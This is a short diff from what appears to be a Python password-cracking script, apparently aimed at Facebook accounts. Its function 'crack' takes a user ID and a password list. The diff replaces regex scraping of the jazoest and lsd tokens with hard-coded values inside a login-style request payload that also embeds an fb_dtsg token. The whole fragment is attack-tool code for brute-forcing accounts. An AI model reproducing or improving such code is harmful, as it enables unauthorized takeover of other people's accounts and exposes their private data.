@@ -193,8 +193,8 @@ def crack(uid, password_list, total_count):
     'hsi': '7604105544532711992',
     'dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw',
     'fb_dtsg': 'NAfu_tNiNgnxzKR2EFtyv_VyKNHx3fpBADatYuEwDtTSE1IHfQuTtOQ:0:0',
-    'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+    'jazoest': '25194',
+    'lsd': 'AdQJS9zk2hcyNnrVkLE6Vr2ttNU',
     'params': json.dumps({
         "params": json.dumps({
             "server_params": {
